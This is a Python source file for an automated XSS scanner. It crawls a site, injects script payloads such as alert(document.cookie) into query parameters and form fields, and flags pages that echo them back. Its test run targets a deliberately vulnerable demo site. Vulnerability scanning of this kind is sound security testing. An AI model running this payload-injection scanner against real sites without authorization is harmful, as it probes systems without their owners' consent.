from random import randint
import requests
import concurrent
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin,parse_qs,urlencode
from bs4 import BeautifulSoup
from scan import get_all_links

def generate_script():
    FUNCTION = [
        "prompt(5000/200)",
        "alert(6000/3000)",
        "alert(document.cookie)",
        "prompt(document.cookie)",
        "console.log(5000/3000)"
    ]
    return "<script>"+FUNCTION[randint(0, 4)]+"</script>"

def run_link_attack(url):
    try:
        query=urlparse(url).query
        payload = generate_script()
        if query != "":
            query_payload=query.replace(query[query.find("=")+1:len(query)],payload,1)
            test=url.replace(query,query_payload,1)
            query_all=url.replace(query,urlencode({x:payload for x in parse_qs(query)}))
            _respon=requests.get(test)
            if payload in _respon.text or payload in requests.get(query_all).text: 
                return {'severity':'Medium','target_url':url,'vulnerable_url':_respon.url,'title':'XSS','method':'GET','description':f'XSS vulnerability found at vulnerable url with payload {payload}'}
    except:
        return None

def run_form_attack(resp):
    keys = {}
    payload=generate_script()
    for item in resp['field']:
        keys[item] = payload
    if 'submit' in resp:
        keys[resp['submit'][0]]=resp['submit'][1]
    if resp['method'] == 'post':
        req = requests.post(resp['action'], data=keys,timeout=5)
    else:
        req = requests.get(resp['action'], params=keys,timeout=5)
    if payload in req.text:
        return (True,keys)
    return (False,keys)

def run_xss(url):
    try:
        res = requests.get(url,timeout=5)
        bsObj = BeautifulSoup(res.content, "html.parser")
        forms = bsObj.find_all("form", method=True)        
        result=[]
        for form in forms:            
            resp = {}
            try:
                if (form['action'].startswith('https') or form['action'].startswith('http')):
                    resp["action"] = form["action"]
                else:
                    resp["action"] = urljoin(url, form["action"])
            except KeyError:
                resp["action"] = res.url
            if form["method"].lower().strip() == "post":
                resp['method'] = 'post'
            else:
                resp['method'] = 'get'
            for key in form.find_all(["input", "textarea"]):
                try:
                    if key.has_attr('name') and key.name == 'input'  and key['type']=='submit':
                        
                        resp['submit']=(key['name'],key['value'])

                    elif key.has_attr('name') and ((key.name == 'textarea') or (key.name == 'input')):
                        
                        if 'field' not in resp:
                            resp['field'] = set()

                        resp['field'].add(key['name'])
                except Exception as e:
                    print('Exception ',e)
                    continue
            try:
                ans =run_form_attack(resp)
                if ans[0]:
                    result.append({'severity':'High','target_url':url,'vulnerable_url':resp['action'],'title':'XSS','method':resp['method'].upper(),'description':f'XSS vulnerability found at vulnerable url with payload {ans[1]}'})
            except:
                continue
        return result
    except :
        return []
    
def run_both_attack(url):
    return (run_xss(url),run_link_attack(url))

def xss(url):
    try:
        res = requests.get(url, timeout=5)
        resp=[]
        if res.status_code == 200:
            all_links=get_all_links(url)
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(run_both_attack, link) for link in all_links]            
                for future in concurrent.futures.as_completed(futures):                    
                    ans = future.result()
                    if ans and ans[0]:
                        resp.append(ans[0])
                    if len(ans)==2 and ans[1]:
                        resp.append(ans[1])    
            return resp
    except :
        return f'Website is Down'

if __name__ == '__main__':
    a=xss('http://testphp.vulnweb.com')
    print('Ans is ',)
    print(a)
    print('Length ',len(a))